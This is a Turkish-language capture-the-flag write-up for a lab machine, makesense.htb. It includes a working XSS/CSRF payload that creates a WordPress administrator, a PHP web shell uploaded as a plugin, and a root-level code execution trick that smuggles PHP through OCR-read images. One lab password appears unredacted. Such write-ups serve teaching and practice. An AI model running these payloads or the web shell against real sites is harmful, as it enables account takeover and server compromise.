@@ -1,0 +1,251 @@
+## Keşif
+
+Standart nmap taramasıyla başladım:
+
+```bash
+nmap -sC -sV -p- --min-rate 5000 -oA full_scan ip
+```
+
+Açık portlar:
+
+```
+22/tcp  — OpenSSH 9.6p1 (Ubuntu)
+443/tcp — Apache 2.4.58 / WordPress 7.0 / TLS (makesense.htb)
+```
+
+`/etc/hosts` dosyasına `makesense.htb` ekledikten sonra siteye baktım. Temiz bir kurumsal site, iletişim formu var ve dikkat çekici bir ses tanıma (whisper) özelliği mevcut.
+
+---
+
+## Foothold — Şifreli XSS Payload ile Admin Bot'u Pwn'lamak
+
+### JavaScript Kaynak Kodunda Şifreleme Anahtarı
+
+Sitenin JS kaynaklarına bakınca `/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js` dosyası dikkatimi çekti:
+
+```javascript
+const ENCRYPTION_KEY = 'x';
+```
+
+Bu anahtar, ses tanıma sonuçlarını sunucuya göndermeden önce şifrelemek için kullanılıyor. Şifreleme mekanizması AES-GCM ve anahtar türetmesi SHA-256:
+
+```javascript
+async function encryptPayload(payload) {
+    const key = await crypto.subtle.importKey(
+        "raw",
+        await crypto.subtle.digest("SHA-256",
+            new TextEncoder().encode(ENCRYPTION_KEY)),
+        { name: "AES-GCM" },
+        false,
+        ["encrypt"]
+    );
+    const iv = crypto.getRandomValues(new Uint8Array(12));
+    const ct = await crypto.subtle.encrypt(
+        { name: "AES-GCM", iv },
+        key, new TextEncoder().encode(JSON.stringify(payload))
+    );
+    // base64(iv + ciphertext + tag) döndürür
+}
+```
+
+Bunun anlamı şu: anahtar açıkta olduğundan, kendi payload'ımızı aynı formatla şifreleyip `save_voice_results` AJAX endpoint'ine gönderebiliyoruz. Sunucu payload'ı çözüp transcription olarak kaydediyor, admin bot da bu kayıtları açıp okuyor.
+
+### Şifreli XSS Payload
+
+İletişim formu gönderiyi bir WordPress post olarak kaydediyor. Admin bot bu postları görüntülerken XSS tetikleniyor:
+
+```python
+import hashlib, os, json, base64, requests
+from Crypto.Cipher import AES
+
+ENC_KEY = "x"
+
+def encrypt_payload(payload: dict) -> str:
+    key = hashlib.sha256(ENC_KEY.encode()).digest()
+    iv  = os.urandom(12)
+    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
+    ct, tag = cipher.encrypt_and_digest(json.dumps(payload).encode())
+    return base64.b64encode(iv + ct + tag).decode()
+```
+
+XSS yükü olarak direkt cookie çalmak mümkün değil çünkü `wordpress_logged_in_` cookie'si `HttpOnly`. Bunun yerine CSRF ile yeni bir admin kullanıcı oluşturuyoruz:
+
+```python
+xss = (
+    "<script>"
+    "fetch('/wp-admin/user-new.php')"
+    ".then(r=>r.text())"
+    ".then(html=>{"
+    "var m=html.match(/name=\"_wpnonce_create-user\" value=\"([^\"]+)\"/);"
+    "var n=m?m[1]:'';"
+    "return fetch('/wp-admin/user-new.php',{method:'POST',"
+    "headers:{'Content-Type':'application/x-www-form-urlencoded'},"
+    "body:'_wpnonce_create-user='+n+'&action=createuser"
+    "&user_login=xentoadmin&email=x@x.com"
+    "&pass1=Xent0Admin!&pass2=Xent0Admin!&role=administrator&createuser=Add+New+User'"
+    "});})"
+    "</script>"
+)
+```
+
+Script:
+1. `/wp-admin/user-new.php` sayfasını çekiyor
+2. CSRF nonce'ı parse ediyor
+3. Admin olarak yeni kullanıcı oluşturuyor
+
+```bash
+python3 exploit.py
+# → xentoadmin:Xent0Admin! hesabı oluşturuldu
+```
+
+### WordPress Admin → www-data
+
+WP Admin paneline giriş yaptıktan sonra standart eklenti yükleme yöntemiyle minimal bir PHP shell yükledim:
+
+```php
+<?php
+/* Plugin Name: X Shell */
+if(isset($_REQUEST['cmd'])){echo "<pre>".shell_exec($_REQUEST['cmd'])."</pre>";}
+```
+
+```bash
+curl -sk "https://makesense.htb/wp-content/plugins/xshell/xshell.php?cmd=id"
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+---
+
+## www-data → walter (User Flag)
+
+`wp-config.php` içinde veritabanı kimlik bilgileri:
+
+```
+DB_USER: x
+DB_PASSWORD: x
+```
+
+Bu şifre SSH için de geçerli:
+
+```bash
+ssh walter@10.129.60.95
+# x
+
+walter@makesense:~$ cat user.txt
+x
+```
+
+---
+
+## walter → root (Root Flag)
+
+### Localhost'ta Root Olarak Çalışan OCR Servisi
+
+```bash
+ss -tlnp
+# 127.0.0.1:8001 LISTEN
+
+ps aux | grep php
+# root  1333  php -S 127.0.0.1:8001 -t /root/ocr4/
+```
+
+Port 8001'de bir PHP built-in server çalışıyor ve belge kökü `/root/ocr4/`. Servis root kullanıcısı tarafından başlatılmış.
+
+```bash
+curl -su "x:x!" http://127.0.0.1:8001/
+```
+
+HTTP Basic Auth `walter:JbhHDAEgXvri3!` ile erişilebiliyor. **MakeSense** adında bir el yazısı OCR uygulaması: canvas üzerine yazı çiziyorsun, Tesseract ile tanımlıyor, dosyaya kaydediyorsun.
+
+### Dosya Kaydetme Özelliği
+
+OCR başarılı olduğunda sonuç sayfasında bir kaydetme formu çıkıyor:
+
+```html
+<form method="post">
+    <input type="hidden" name="ocr_id" value="ocr_6a690250c71524.31917210">
+    <input type="text" name="filename" placeholder="result.txt">
+    <button name="save_output">Save</button>
+</form>
+```
+
+Sunucu, OCR metnini `saved/<filename>` yoluna kaydediyor. `filename` parametresi `basename()` ile sanitize edildiğinden path traversal çalışmıyor. Ama burada kritik bir nokta var: **dosya root yetkileriyle `/root/ocr4/saved/` altına yazılıyor** ve PHP built-in server bu dosyaları doğrudan PHP olarak çalıştırıyor.
+
+### OCR → PHP Code Execution
+
+Tesseract'ın PHP kodu okuyabilmesi için ImageMagick ile istenen metni içeren bir PNG oluşturdum:
+
+```bash
+convert -size 600x80 xc:white \
+  -font "DejaVu-Sans-Mono" \
+  -pointsize 32 \
+  -fill black \
+  -draw "text 5,60 '<?php passthru(\"cat /root/root.txt\"); ?>'" \
+  phproot.png
+```
+
+Ardından bu PNG'yi OCR servisine gönderdim:
+
+```bash
+IMG=$(python3 -c "
+import base64
+print('data:image/png;base64,' + base64.b64encode(open('phproot.png','rb').read()).decode())
+")
+
+# OCR request
+curl -su "walter:JbhHDAEgXvri3!" -X POST \
+  --data-urlencode "canvas_image=${IMG}" \
+  -c jar.txt -b jar.txt \
+  http://127.0.0.1:8001/ > result.html
+
+OCR_ID=$(grep -oP 'name="ocr_id" value="\K[^"]+' result.html)
+# → ocr_6a690250c71524.31917210
+
+# OCR çıktısı: <?php passthru("cat /root/root.txt"); ?>
+```
+
+OCR metni tam okundu. Şimdi PHP dosyası olarak kaydedelim:
+
+```bash
+curl -su "x:x" -X POST \
+  -c jar.txt -b jar.txt \
+  -d "ocr_id=${OCR_ID}&filename=root.php&save_output=Save" \
+  http://127.0.0.1:8001/
+# → Saved as: saved/root.php
+```
+
+```bash
+curl http://127.0.0.1:8001/saved/root.php
+# x
+```
+
+PHP, `/root/ocr4/saved/root.php` dosyasını **root olarak** çalıştırdı.
+
+---
+
+## Saldırı Zinciri
+
+```
+makesense.htb (HTTPS / WordPress 7.0)
+        ↓
+whisper-wrapper.js → ENCRYPTION_KEY açıkta
+        ↓
+AES-GCM şifrelenmiş XSS payload → save_voice_results AJAX
+        ↓
+Admin bot iletişim formu kaydını açıyor → XSS tetikleniyor
+        ↓
+CSRF: /wp-admin/user-new.php → x:x! (Administrator)
+        ↓
+WP Admin → kötü amaçlı PHP eklentisi yükleme → www-data RCE
+        ↓
+wp-config.php → x:x! → SSH → user flag
+        ↓
+localhost:8001 → php -S (root) → OCR servisi (x:x!)
+        ↓
+ImageMagick ile PHP kodu PNG olarak render edildi
+        ↓
+Tesseract OCR → <?php passthru("..."); ?> metni okundu
+        ↓
+saved/root.php olarak kaydedildi → PHP (root) çalıştırdı → root flag
+```
+
+---
